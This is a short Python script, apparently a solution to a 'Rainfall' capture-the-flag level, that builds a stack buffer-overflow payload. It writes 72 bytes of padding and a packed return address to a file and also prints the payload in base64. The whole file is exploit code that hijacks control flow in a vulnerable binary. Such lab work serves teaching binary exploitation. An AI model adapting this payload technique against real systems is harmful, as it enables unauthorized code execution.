import struct
from base64 import b64encode

#offset = 80  # on local machine
offset = 72   # on Rainfall VM
n_addr = 0x8048454

payload = b""
payload += b"A" * offset
payload += struct.pack("I", n_addr)

print(b64encode(payload).decode())

with open("payload", "wb") as f:
    f.write(payload)